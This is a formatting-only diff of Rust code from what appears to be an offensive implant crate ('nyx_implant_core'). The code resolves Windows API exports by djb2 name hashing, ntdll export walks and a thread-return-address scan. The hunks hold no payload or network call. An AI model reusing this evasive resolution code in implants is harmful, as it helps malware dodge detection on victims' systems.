@@ -340,8 +340,9 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
                 if h as u64 == target {
                     hit = i as u64 + 1;
                     let ords = unsafe { b.add(ords_rva as usize) } as *const u16;
-                    let funcs = unsafe { b.add((unsafe { *(dir.add(0x1C) as *const u32) }) as usize) }
-                        as *const u32;
+                    let funcs =
+                        unsafe { b.add((unsafe { *(dir.add(0x1C) as *const u32) }) as usize) }
+                            as *const u32;
                     let ord = (unsafe { *ords.add(i) }) as usize;
                     if ord < num_funcs as usize {
                         fn_rva = (unsafe { *funcs.add(ord) }) as u64;
@@ -367,13 +368,15 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
             unsafe { diag_u64(17, head) };
             let mut h: u32 = 5381;
             for &c in func {
-                h = h.wrapping_mul(33).wrapping_add(c.to_ascii_lowercase() as u32);
+                h = h
+                    .wrapping_mul(33)
+                    .wrapping_add(c.to_ascii_lowercase() as u32);
             }
             unsafe { diag_u64(18, h as u64) };
         }
     }
     stamp_diag(0xD1); // parent-base miss (post-mortem milestone)
-    // 2) loader-walk by export feature (name fields moved on 24H2)
+                      // 2) loader-walk by export feature (name fields moved on 24H2)
     let walk_nt = unsafe { ntdll_via_export_walk() };
     unsafe { diag_u64(2, walk_nt.unwrap_or(0) as u64) };
     if let Some(nt) = walk_nt {
@@ -396,7 +399,7 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
         }
     }
     stamp_diag(0xD2); // export-probe walk miss
-    // 3) thread return address -> ntdll scan (last resort)
+                      // 3) thread return address -> ntdll scan (last resort)
     if let Some(r) = scan_ntdll(nyx_implant_core::resolve::djb2(func)) {
         return Some(r);
     }
